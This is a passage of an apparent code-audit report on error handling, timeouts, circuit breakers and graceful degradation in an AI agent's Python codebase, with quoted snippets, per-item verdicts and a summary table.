#### P77-7 · SessionDB Failure in `run_agent.py` — ✅ GRACEFUL DEGRADATION

**Files:** `run_agent.py` lines 501–503, 520–524

```python
try:
    self._session_db = SessionDB()
    return self._session_db
except Exception as exc:
    logger.debug("SessionDB unavailable for recall", exc_info=True)
    return None
```

and:

```python
except Exception as e:
    # Transient failure (e.g. SQLite lock). Keep _session_db alive —
    # _session_db_created stays False so next run_conversation() retries.
    logger.warning("Session DB creation failed (will retry next turn): %s", e)
```

**Analysis:** Good. Transient SQLite lock failures retry on next turn. SessionDB unavailability is non-fatal — agent continues without session persistence.

**Status:** ✅ Good recovery pattern.

---

#### P77-8 · `RuntimeError` Handling in `model_tools.py` — ✅ ROBUST

**File:** `model_tools.py` lines 106–107

```python
try:
    loop = asyncio.get_running_loop()
except RuntimeError:
    loop = None
```

Handles the case when no running event loop exists (outside async context). The code then branches based on whether `loop` is `None` and whether it's already running.

**Status:** ✅ Good — handles non-async caller context.

---

#### P77-9 · Client Recreation on `RuntimeError` in `run_agent.py` — ✅ RECOVERY

**File:** `run_agent.py` line 2526

```python
if not self._replace_primary_openai_client(reason=f"recreate_closed:{reason}"):
    raise RuntimeError("Failed to recreate closed OpenAI client")
```

**Analysis:** When a closed OpenAI client is detected, the agent attempts to recreate it. If recreation fails, it raises a `RuntimeError` — not silently continuing with a broken client. This is correct.

**Status:** ✅ Good — hard fail on unrecoverable client state.

---

#### P77-10 · `append_message` Failure in `run_agent.py` — ✅ WARNING-ONLY GRACEFUL

**File:** `run_agent.py` lines 1296–1297

```python
except Exception as e:
    logger.warning("Session DB append_message failed: %s", e)
```

**Analysis:** Session DB write failure is non-fatal for the current turn. The message is still in memory. This is acceptable — persistent session storage is best-effort.

**Status:** ✅ Acceptable — warning-only, non-fatal.

---

### 3. Timeout Handling

#### P77-11 · Tool Call Timeout in `model_tools.py` — ✅ 300s FIXED TIMEOUT

**File:** `model_tools.py` lines 145–161

```python
return future.result(timeout=300)
except concurrent.futures.TimeoutError:
    # Cancel the coroutine inside its own loop so the worker thread
    # can wind down instead of running forever.
    if loop_ready.wait(timeout=1.0) and worker_loop is not None:
        try:
            for t in asyncio.all_tasks(worker_loop):
                worker_loop.call_soon_threadsafe(t.cancel)
        except RuntimeError:
            # Loop already closed — nothing to cancel.
            pass
    raise
finally:
    pool.shutdown(wait=False)
```

**Analysis:** 300-second timeout on all tool calls. On timeout:
1. Tasks are cancelled inside their own loop via `call_soon_threadsafe`
2. Worker loop is cleanly torn down
3. `pool.shutdown(wait=False)` ensures the thread doesn't block the caller

This was a fix for a prior bug where the worker thread leaked on every timeout. The current implementation is correct.

**Status:** ✅ Good — hard timeout with clean cancellation.

---

#### P77-12 · MCP Server Config Timeouts — ✅ DOCUMENTED

**File:** `tools/mcp_tool.py` lines 20–45

```python
timeout: 120         # per-tool-call timeout in seconds (default: 120)
connect_timeout: 60  # initial connection timeout (default: 60)
```

Per-server configurable timeouts with sensible defaults. The module-level documentation explicitly describes the timeout architecture.

**Status:** ✅ Good — documented, configurable.

---

#### P77-13 · `asyncio.timeout` / `asyncio.wait_for` Usage in `cron/scheduler.py` — ✅ CORRECT

**Files:** `cron/scheduler.py` lines 558–560, 687–689

```python
try:
    result = future.result(timeout=30)
except TimeoutError:
    future.cancel()
    raise
```

```python
try:
    send_result = future.result(timeout=60)
except TimeoutError:
    future.cancel()
    raise
```

**Analysis:** Cron scheduler uses explicit `timeout=` parameter on `future.result()`. After `TimeoutError`, the future is cancelled and the error is re-raised. Correct.

**Status:** ✅ Good — explicit timeouts with cancellation on timeout.

---

#### P77-14 · No Indefinite Waits Found — ✅ CLEAN

**Analysis:** Across `run_agent.py`, `model_tools.py`, `gateway/`, `cron/scheduler.py`, all wait operations have explicit timeouts:
- Tool calls: 300s (`model_tools.py`)
- MCP connection: 60s connect, 120s per-call
- Cron futures: 30s / 60s
- Status writes: no wait (fire-and-forget with logging)
- Stream consumer: uses `queue.Queue` with `get(timeout=...)`

No `while True:` loops without sleep/timeout were found in error-handling paths.

**Status:** ✅ Clean — no indefinite waits detected.

---

### 4. Circuit Breaker Patterns

#### P77-15 · MCP Circuit Breaker — ✅ ROBUST 3-STATE DESIGN

**Files:** `tools/mcp_tool.py` lines 1718–1764, test at `tests/tools/test_mcp_circuit_breaker.py`

**State machine:**
```
closed    — error count below threshold; all calls go through.
open      — threshold reached; calls short-circuit until cooldown elapses.
half-open — cooldown elapsed; next call is a probe. Probe success → closed.
           Probe failure → reopens (cooldown re-armed).
```

**Key details:**
- `_CIRCUIT_BREAKER_THRESHOLD = 3` — trips after 3 consecutive failures
- `_CIRCUIT_BREAKER_COOLDOWN_SEC = 60.0` — 60-second cooldown before half-open
- `_server_breaker_opened_at` records monotonic timestamp for cooldown clock
- `_reset_server_error` clears both count and timestamp on any success
- `_bump_server_error` stamps the open timestamp when threshold is crossed
- Tests verify the half-open probe resets the breaker correctly (fixed from earlier 2-state design where breaker stayed open forever)

**Analysis:** The circuit breaker is well-designed:
- No race condition between `_bump_server_error` and `_reset_server_error` — they're called in distinct code paths (failure vs success)
- Cooldown prevents thundering-herd on a recovering server
- Half-open probe ensures only one test call before resetting

**Status:** ✅ Good — properly implements 3-state circuit breaker with cooldown.

---

#### P77-16 · Telegram Polling Network Error Circuit — ✅ BACKOFF WITH LIMIT

**File:** `gateway/platforms/telegram.py` lines 878–922

```python
MAX_NETWORK_RETRIES = 10
BASE_DELAY = 5
MAX_DELAY = 60
```

Reconnect ladder with bounded retries. After 10 failed network error retries, the gateway is restarted. This prevents infinite reconnect loops while still attempting recovery.

**Status:** ✅ Good — bounded retry with escalation.

---

#### P77-17 · Tool Guardrail Circuit Breaker — ✅ ADVISORY (NOT HARD)

**File:** `agent/tool_guardrails.py` lines 63–80

```python
@dataclass(frozen=True)
class ToolCallGuardrailConfig:
    warnings_enabled: bool = True
    hard_stop_enabled: bool = False  # Opt-in
    exact_failure_warn_after: int = 2
    exact_failure_block_after: int = 5
    same_tool_failure_warn_after: int = 3
    same_tool_failure_halt_after: int = 8
```

**Analysis:** Guardrail is *advisory by default* (`hard_stop_enabled=False`). When hard stops are enabled via config, the agent halts the tool loop after thresholds. This is a soft circuit breaker — the model can still be instructed to continue. The default is warnings only.

**Status:** ✅ Good — fails gracefully to warnings by default; hard stop is opt-in.

---

### 5. Graceful Degradation

#### P77-18 · MCP Tool Handler — Graceful Degradation on Server Failure — ✅ GOOD

**File:** `tools/mcp_tool.py` lines 2067–2072

```python
except Exception as retry_exc:
    logger.warning("MCP %s/%s retry after session reconnect failed: %s", ...)
return None
```

When retry after reconnect fails, the handler returns `None` (not an exception). The calling code converts this to an error tool result message telling the model the server is unreachable.

**Status:** ✅ Good — clean degradation, model informed, no exception leaking to user.

---

#### P77-19 · `_write_runtime_status_safe` — Silent Degradation — ✅ DOCUMENTED

**File:** `gateway/platforms/base.py` lines 1571–1601

Status writes fail silently (first failure at WARNING, rest at DEBUG). This is documented as intentional to prevent log spam on reconnect loops when the status directory has permissions/ENOSPC issues.

**Analysis:** Platform adapter's `has_fatal_error` and `fatal_error_message` properties remain functional even if status file writes fail. The system degrades to in-memory state tracking only.

**Status:** ✅ Acceptable — explicitly documented, in-memory state still works.

---

#### P77-20 · Stream Consumer — Rate-Limited Progressive Editing — ✅ GRACEFUL

**File:** `gateway/stream_consumer.py`

Stream consumer buffers tokens and edits the platform message at configured intervals. If the platform edit fails, the stream consumer falls back to sending a new message rather than losing content.

**Status:** ✅ Good — buffers and retries, degrades to new-message on edit failure.

---

#### P77-21 · MCP Discovery Moved from Module-Level to Lazy Import — ✅ FIXED

**File:** `model_tools.py` lines 182–193

> MCP tool discovery used to run as a module-level side effect using a blocking `future.result(timeout=120)`, freezing Discord/Telegram heartbeats for up to 120s when any MCP server was slow. This was fixed by moving discovery to explicit call sites with their own async handling.

**Analysis:** This was a significant graceful degradation improvement — slow/unreachable MCP servers no longer block gateway startup or freeze platform heartbeats.

**Status:** ✅ Fixed — lazy import, no blocking on startup.

---

#### P77-22 · Platform Adapter Fatal Error State — ✅ CLEAN DEGRADATION

**File:** `gateway/platforms/base.py` lines 1518–1523

```python
@property
def has_fatal_error(self) -> bool:
    return self._fatal_error_message is not None

@property
def fatal_error_message(self) -> Optional[str]:
    return self._fatal_error_message
```

Platform adapters track fatal errors and expose them to the gateway layer. When `has_fatal_error` is True, the gateway can route around the broken adapter or surface the error to operators.

**Status:** ✅ Good — explicit fatal error state for operator visibility.

---

### Summary Table

| Topic | Status | Notes |
|-------|--------|-------|
| Bare `except:` clauses | ✅ CLEAN | Historical bare `except: pass` in base.py replaced with scoped Exception handler |
| `except Exception: pass` patterns | ✅ MOSTLY CLEAN | All instances either intentionally silent (UI enhancement, gateway probe) or debug-level logged |
| `cron/scheduler.py` silent exceptions | ⚠️ OUTSTANDING | P34-1 — fully silent `except: pass` for platform plugin routing failures |
| SessionDB/agent state failure recovery | ✅ GOOD | Non-fatal, retries next turn, warning logged |
| Timeout values (300s tools, 120s MCP, 60s connect) | ✅ APPROPRIATE | Fixed timeouts throughout, no indefinite waits |
| Timeout cancellation (`concurrent.futures.TimeoutError`) | ✅ GOOD | Proper task cancellation inside worker loop |
| MCP circuit breaker (3-state: closed/open/half-open) | ✅ ROBUST | Threshold=3, cooldown=60s, probe resets on success |
| Telegram reconnect ladder (max 10 retries) | ✅ BOUNDED | Escalates to gateway restart after exhaustion |
| Tool guardrail advisory circuit | ✅ SAFE | Defaults to warnings-only; hard stop opt-in |
| MCP graceful degradation on server failure | ✅ GOOD | Returns None, model informed, no exception leaking |
| Stream consumer progressive editing | ✅ GOOD | Rate-limited, falls back to new message on edit failure |
| MCP discovery blocking on startup | ✅ FIXED | Moved to lazy import, no 120s freeze on gateway startup |
| Platform fatal error state exposure | ✅ GOOD | has_fatal_error / fatal_error_message for operator visibility |

**FINDING:** 0 new critical issues. 1 pre-existing outstanding issue (P34-1, cron silent exception swallowing in `cron/scheduler.py`). All other patterns are correctly implemented.

---

*Pass #77 complete — 2026-05-25T21:35:00Z*
*Commit at scan: 5a51a1f65*
